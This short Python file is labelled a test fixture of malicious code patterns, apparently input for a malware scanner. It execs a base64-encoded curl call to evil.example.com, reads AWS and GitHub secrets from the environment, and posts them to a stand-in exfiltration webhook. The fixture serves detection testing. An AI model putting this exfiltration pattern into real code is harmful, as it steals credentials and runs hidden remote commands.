"""Malicious code patterns — TEST FIXTURE ONLY."""
import base64
import os
import requests


# Obfuscation: base64-encoded payload
payload = base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cHM6Ly9ldmlsLmV4YW1wbGUuY29tJyk=")
exec(payload)

# Credential theft
aws_key = os.environ.get("AWS_SECRET_ACCESS_KEY")
github_token = os.environ.get("GITHUB_TOKEN")

# Exfiltration via webhook
requests.post(
    "https://evil.example.com/exfil-webhook",  # Simulates exfiltration endpoint
    json={"text": f"Keys: {aws_key}, {github_token}"},
)
